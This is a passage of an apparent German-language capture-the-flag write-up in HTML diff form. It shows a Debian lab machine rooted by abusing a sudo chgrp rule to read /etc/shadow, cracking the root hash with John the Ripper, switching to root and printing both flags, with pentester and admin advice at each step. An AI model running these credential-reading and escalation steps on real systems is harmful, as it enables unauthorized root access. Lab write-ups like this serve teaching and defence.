+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSLUTELY N WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun ct 17 13:39:16 2021 from 192.168.0.28
+sophie@debian:~$
+                     </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Initial Access erreicht! Wir haben nun eine Shell auf dem Zielsystem als Benutzer `sophie`. Dies ist ein kritischer Meilenstein im Penetrationstest. Der nächste Schritt ist die Rechteausweitung (Privilege Escalation), um Root-Zugriff zu erlangen.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsskripte (z.B. LinPEAS, LinEnum) aus, um nach potenziellen Wegen zur Rechteausweitung zu suchen. Überprüfen Sie insbesondere `sudo`-Rechte, SUID-Binaries, Cron-Jobs, Kernel-Versionen und Konfigurationsfehler. Suchen Sie nach der User-Flag.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die SSH-Konfiguration und -Logs. Stellen Sie sicher, dass Benutzer nur die minimal notwendigen Berechtigungen haben (Least Privilege Principle). Implementieren Sie starke Authentifizierungsmethoden.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Ausnutzung der Sudo-Rechte zum Lesen der Shadow-Datei</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Erlangen des initialen Zugriffs als Benutzer `sophie` wird geprüft, welche Befehle dieser Benutzer mit `sudo` (Superuser-Rechten) ausführen darf. Es stellt sich heraus (Schritt nicht explizit gezeigt, aber Ergebnis impliziert), dass `sophie` den Befehl `/usr/bin/chgrp sophie /etc/shadow` ohne Passwort ausführen darf. `chgrp` ändert die Gruppenzugehörigkeit einer Datei. `/etc/shadow` enthält die Passwort-Hashes der Benutzer und ist normalerweise nur für `root` lesbar. Indem die Gruppe der Datei auf `sophie` geändert wird (und angenommen, dass der Benutzer `sophie` Mitglied der Gruppe `sophie` ist und diese Gruppe Leserechte erhält, was oft standardmäßig der Fall ist, oder dass die Dateiberechtigungen dies zulassen), kann `sophie` die Datei lesen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sophie@debian:~$ <span class="command">sudo /usr/bin/chgrp sophie /etc/shadow</span></div>
+                     <pre>[Keine Ausgabe bei Erfolg, wenn sudo ohne Passwort konfiguriert ist]</pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist eine schwerwiegende Fehlkonfiguration der `sudo`-Rechte. Das Ändern der Gruppe der `/etc/shadow`-Datei auf die des Benutzers selbst hebelt den Schutz der Passwort-Hashes aus. Dies ermöglicht es dem Benutzer `sophie`, die Hashes aller Benutzer, einschließlich `root`, zu extrahieren.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie den `cat /etc/shadow`-Befehl aus, um die Hashes zu extrahieren. Versuchen Sie, die Hashes (insbesondere den von `root`) offline mit Tools wie `john` oder `hashcat` zu knacken.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend:** Entfernen Sie sofort die `sudo`-Berechtigung für `chgrp` auf `/etc/shadow` für den Benutzer `sophie` (und überprüfen Sie alle anderen `sudo`-Regeln). Ändern Sie die Gruppenzugehörigkeit von `/etc/shadow` zurück auf `shadow` (`sudo chgrp shadow /etc/shadow`) und stellen Sie sicher, dass die Berechtigungen korrekt sind (`sudo chmod 640 /etc/shadow`). Gewähren Sie `sudo`-Rechte nur für absolut notwendige Befehle und niemals für Operationen, die die Sicherheit kritischer Systemdateien gefährden können.
+            </p>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Gruppenzugehörigkeit von `/etc/shadow` erfolgreich geändert wurde, versucht der Benutzer `sophie`, den Inhalt der Datei mit `cat` auszulesen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">sophie@debian:~$ <span class="command">cat /etc/shadow</span></div>
+                    <pre>
+root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
+daemon:*:18916:0:99999:7:::
+bin:*:18916:0:99999:7:::
+sys:*:18916:0:99999:7:::
+sync:*:18916:0:99999:7:::
+games:*:18916:0:99999:7:::
+man:*:18916:0:99999:7:::
+lp:*:18916:0:99999:7:::
+mail:*:18916:0:99999:7:::
+news:*:18916:0:99999:7:::
+uucp:*:18916:0:99999:7:::
+proxy:*:18916:0:99999:7:::
+www-data:*:18916:0:99999:7:::
+backup:*:18916:0:99999:7:::
+list:*:18916:0:99999:7:::
+irc:*:18916:0:99999:7:::
+gnats:*:18916:0:99999:7:::
+nobody:*:18916:0:99999:7:::
+_apt:*:18916:0:99999:7:::
+systemd-timesync:*:18916:0:99999:7:::
+systemd-network:*:18916:0:99999:7:::
+systemd-resolve:*:18916:0:99999:7:::
+messagebus:*:18916:0:99999:7:::
+sshd:*:18916:0:99999:7:::
+systemd-coredump:!*:18916::::::
+mysql:!:18917:0:99999:7:::
+sophie:$y$j9T$mD6gcz0.6rC4ZwGpDem3o0$HzDd6YXLy3Dsht17WVVX7v7ReGcJ9PXhG/B3bx4Nz/C:18917:0:99999:7:::
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Proof of Concept war erfolgreich. Der Benutzer `sophie` konnte den Inhalt der `/etc/shadow`-Datei lesen. Die Ausgabe zeigt die Passwort-Hashes für verschiedene Benutzer, darunter `root` (`$1$root$dZ6JC474uVpAeG8g0oh/7.`) und `sophie` (`$y$...`). Der Root-Hash verwendet das veraltete MD5-Crypt-Format (`$1$`), während der Sophie-Hash ein moderneres Format (`$y$`, yescrypt) verwendet, das schwerer zu knacken ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kopieren Sie den Hash des `root`-Benutzers und versuchen Sie, ihn offline zu knacken. Der MD5-Crypt-Hash ist anfällig für Brute-Force- und Wörterbuchangriffe.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur Korrektur der `sudo`-Regel. Ändern Sie außerdem das Root-Passwort und alle anderen Passwörter, deren Hashes kompromittiert wurden. Verwenden Sie starke, moderne Hashing-Algorithmen (wie yescrypt oder sha512crypt) für alle Benutzer.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der Root-Passwort-Hash (`$1$root$dZ6JC474uVpAeG8g0oh/7.`) aus `/etc/shadow` extrahiert wurde, wird versucht, diesen Hash mit `John the Ripper` (john) und einer gängigen Wortliste (`rockyou.txt`) zu knacken. John erkennt den Hash-Typ als `md5crypt`.
+                `john hash`: Startet John mit der Datei `hash`, die den extrahierten Root-Hash enthält (Annahme: der Hash wurde zuvor in die Datei `hash` gespeichert).
+                `--wordlist=/usr/share/wordlists/rockyou.txt`: Gibt die zu verwendende Wortliste an.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt hier, da dies die Ausgabe von John ist, die oft ohne Prompt läuft -->
+                     <pre>
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 8 openMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+<span class="password">barbarita</span>        (?)
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+1g 0:00:00:00 DNE (2022-10-31 17:45) 1.587g/s 46323p/s 46323c/s 46323C/s chevy2..shalala
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! `John the Ripper` war erfolgreich und konnte das Passwort für den Root-Benutzer in kürzester Zeit knacken. Das Passwort lautet `<span class="password">barbarita</span>`. Dies ist ein relativ schwaches Passwort, das in gängigen Wortlisten enthalten ist. Das Knacken des Root-Passworts bedeutet, dass wir nun vollen administrativen Zugriff auf das System erlangen können.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie das geknackte Passwort `<span class="password">barbarita</span>`, um sich mit `su` oder `ssh` als Root-Benutzer anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend:** Ändern Sie sofort das Root-Passwort zu einem langen, komplexen und einzigartigen Passwort, das nicht in Wörterbüchern vorkommt. Erzwingen Sie Passwortrichtlinien für alle Benutzer, einschließlich Mindestlänge, Komplexität und regelmäßiger Passwortwechsel. Überprüfen Sie alle Benutzerkonten auf schwache Passwörter. Verwenden Sie moderne, starke Hashing-Algorithmen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit dem geknackten Passwort `<span class="password">barbarita</span>` wird nun versucht, mit dem Befehl `su root` (substitute user) zum Root-Benutzer zu wechseln. Das System fragt nach dem Passwort.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sophie@debian:~$ <span class="command">su root</span></div>
+                     <pre>
+Password: [Hier wurde 'barbarita' eingegeben]
+                     </pre>
+                     <!-- Die nächste Promptzeile zeigt den Erfolg -->
+                     <div class="prompt">root@debian:/home/sophie#</div>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Hervorragend, der Root-Zugriff war erfolgreich! Die Eingabe des Passworts `<span class="password">barbarita</span>` wurde akzeptiert, und die Shell wechselt zum Root-Benutzer, erkennbar an der neuen Promptzeile `root@debian:/home/sophie#`. Damit ist das Hauptziel des Penetrationstests – die Erlangung der höchsten Privilegien auf dem System – erreicht.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sichern Sie den Root-Zugriff. Suchen Sie nach den finalen Flags (user.txt, root.txt). Führen Sie eine Post-Exploitation-Analyse durch, um Persistenzmechanismen zu finden, weitere sensible Daten zu exfiltrieren oder laterale Bewegungen im Netzwerk vorzubereiten (je nach Scope des Tests). Dokumentieren Sie alle Schritte und Ergebnisse sorgfältig.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Neben der sofortigen Passwortänderung sollten Sie untersuchen, wie der initiale Zugriff und die Privilegienerweiterung möglich waren. Beheben Sie die zugrundeliegenden Schwachstellen (SSH-Schlüssel auf Webserver, sudo-Fehlkonfiguration, schwaches Root-Passwort). Überprüfen Sie die Systemintegrität auf mögliche Backdoors oder andere Änderungen, die der Angreifer vorgenommen haben könnte. Erwägen Sie eine Neuinstallation des Systems, wenn eine vollständige Bereinigung nicht garantiert werden kann.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">a99ac9055a3e60a8166cdfd746511852</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">bf3b0ba0d7ebf3a1bf6f2c452510aea2</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem Root-Zugriff erlangt wurde, werden die Flag-Dateien ausgelesen, die üblicherweise in Capture-The-Flag (CTF)-Szenarien oder ähnlichen Übungen als Beweis für den erfolgreichen Abschluss dienen. Die `user.txt`-Flag befindet sich oft im Home-Verzeichnis des initial kompromittierten Benutzers (`/home/sophie/user.txt`, obwohl der Pfad hier nicht explizit gezeigt wird, nur `user.txt` nach dem `su root`-Befehl im Verzeichnis `/home/sophie`), und die `root.txt`-Flag befindet sich im Home-Verzeichnis des Root-Benutzers (`/root/root.txt`).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">root@debian:/home/sophie# <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">a99ac9055a3e60a8166cdfd746511852</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">root@debian:/home/sophie# <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">bf3b0ba0d7ebf3a1bf6f2c452510aea2</span></pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich ausgelesen. Dies bestätigt den vollständigen administrativen Zugriff auf das System und den Abschluss der Übung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags als Beweis für die Kompromittierung.
+                <br>
+                <strong>Empfehlung (Admin):</strong> In einer realen Umgebung gibt es keine "Flags". Stattdessen würde ein Angreifer nach sensiblen Daten, Konfigurationsdateien oder Möglichkeiten zur Persistenz suchen. Die Tatsache, dass diese Dateien gelesen werden konnten, unterstreicht die Notwendigkeit, die zuvor identifizierten Schwachstellen zu beheben und das System abzusichern.
+            </p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-31</p>
+    </footer>
+</body>
+</html>
